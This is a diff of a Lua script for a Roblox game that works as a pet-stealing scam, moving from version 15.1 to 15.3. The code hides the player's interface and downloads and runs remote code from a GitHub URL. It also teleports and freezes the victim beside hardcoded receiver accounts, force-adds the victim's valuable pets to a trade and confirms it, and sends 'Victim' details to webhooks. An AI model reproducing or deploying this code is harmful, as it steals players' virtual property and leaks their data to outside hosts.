@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v15.1 - DGRBGG BUILD ]] --
+-- [[ MONDEUR ELITE v15.3 - "PEN" STABILITY BUILD ]] --
 if _G.__Ran then return end
 _G.__Ran = true
 
@@ -8,72 +8,63 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- API Core Paths
 local API = ReplicatedStorage:WaitForChild("API")
 local TradeAPI = API:WaitForChild("TradeAPI")
 
--- 1. Dualhook Logging Logic
+-- FEATURE: Dualhook Logging
 local function DualLog(petName, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
-            ["title"] = "🚀 Mondeur Dualhook: Pet Captured",
+            ["title"] = "🎯 Mondeur Pen: Hit Logged",
             ["fields"] = {
                 {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = true},
                 {["name"] = "Pet", ["value"] = petName, ["inline"] = true},
                 {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
             },
-            ["color"] = 0xff0000,
-            ["footer"] = {["text"] = "Mondeur Elite v15.1"}
+            ["color"] = 0x00ffff
         }}
     })
-
     local urls = {getgenv().WEBHOOK, "YOUR_BOT_WEBHOOK_HERE"} 
     for _, url in pairs(urls) do
         if url and url ~= "" then
-            task.spawn(function()
-                pcall(function() 
-                    request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
-                end)
-            end)
+            task.spawn(function() pcall(function() request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end) end)
         end
     end
 end
 
--- 2. Lockdown & Security Features
-local function Lockdown(receiverName)
+-- FEATURE: UI Lockdown & Stable Teleport
+local function Lockdown(receiver)
     pcall(function()
-        -- Disable Core UI
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        
-        -- Load Loading Screen UI
         loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         
-        -- Physical Lockdown
-        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
-        local target = Players[receiverName].Character:FindFirstChild("HumanoidRootPart")
+        -- [[ FIX: Stable Character Check ]] --
+        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local hum = char:WaitForChild("Humanoid")
+        local hrp = char:WaitForChild("HumanoidRootPart")
         
-        if hrp and target then
+        local targetChar = receiver.Character or receiver.CharacterAdded:Wait()
+        local targetHrp = targetChar:WaitForChild("HumanoidRootPart")
+        
+        if hrp and targetHrp then
             hum.Sit = false
-            task.wait(0.1)
-            hrp.CFrame = target.CFrame * CFrame.new(0, 0, 3)
+            task.wait(0.2)
+            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
             hrp.Anchored = true
         end
     end)
 end
 
--- 3. Ultra-Fast Trading Logic (Using ClientData)
+-- FEATURE: Inventory Scan
 local function executeTrade(targetPlayer)
     local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
     local inventory = ClientData.get_data().inventory
     
     if inventory and inventory.pets then
-        Lockdown(targetPlayer.Name)
+        Lockdown(targetPlayer)
 
         for _, petData in pairs(inventory.pets) do
-            -- Uses your Arfud Database
             local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
-            
             if val >= (getgenv().THRESHOLD or 0) then
                 task.spawn(function()
                     TradeAPI:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
@@ -82,17 +73,16 @@ local function executeTrade(targetPlayer)
             end
         end
         
-        -- Accept & Confirm Sequence
-        task.wait(0.3)
+        task.wait(0.5)
         TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
         task.wait(0.2)
         TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
     end
 end
 
--- 4. Main Execution Loop
+-- MAIN LOOP
 task.spawn(function()
-    while task.wait(0.5) do
+    while task.wait(1) do
         local admins = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
         for _, name in pairs(admins) do
             local target = Players:FindFirstChild(name)
